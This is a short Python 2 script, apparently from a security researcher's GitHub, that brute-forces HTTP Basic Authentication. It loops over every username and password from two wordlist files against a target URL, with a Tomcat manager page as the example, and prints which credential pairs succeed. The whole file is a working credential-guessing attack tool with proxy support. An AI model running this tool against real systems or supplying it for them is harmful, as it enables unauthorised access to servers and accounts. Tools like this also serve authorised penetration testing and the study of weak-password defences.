#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'bit4'
#github:https://github.com/bit4woo

import requests
import sys
from requests.auth import HTTPBasicAuth
import argparse


def judge_web(self):
    try:
        res = requests.get(self)
    except requests.RequestException as e:
        print "url error"
        exit()

def judge_file(self):
    try:
        open(self,'r')
    except IOError as e:
        print "can not find file"
        exit()

def parser_error(errmsg):
    #banner()
    print "Usage: python "+sys.argv[0]+" [Options] use -h for help"
    print "Error: "+errmsg
    sys.exit()

def parse_args():
    #parse the arguments
    parser = argparse.ArgumentParser(epilog = '\r\nExample: \r\npython '+sys.argv[0]+" -u user.txt -p pass.txt -t http://www.xxx.com/manager/html --proxy http://127.0.0.1:8080")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--user', help="File contains user names", required=True)
    parser.add_argument('-p', '--password', help='File contains passwords', required=True)
    parser.add_argument('-t', '--target', help='The url of the target', required=True)
    parser.add_argument('--proxy', help='http or https proxy', default='')
    return parser.parse_args()


def main():
    args = parse_args()
    #proxy = { "http": "http://127.0.0.1:8080", }
    proxy = {args.proxy.split(":")[0] : args.proxy} #即使proxy ={}为空也是可以正确执行的
    #print proxy
    judge_file(args.user)
    judge_file(args.password)
    judge_web(args.target)

    for i in open(args.user, 'r').readlines():
        for j in open(args.password, 'r').readlines():
            try:
                res = requests.get(args.target, auth=HTTPBasicAuth(i.split()[0], j.split()[0]), proxies=proxy) #use proxy to view request detail --debug
                if res.status_code == 401:
                    print "Failed {0}:{1}".format(i.split()[0], j.split()[0])
                else:
                    print "successed {0}:{1}".format(i.split()[0], j.split()[0])
            except requests.RequestException as e:
                print e
if __name__ == '__main__':
    main()
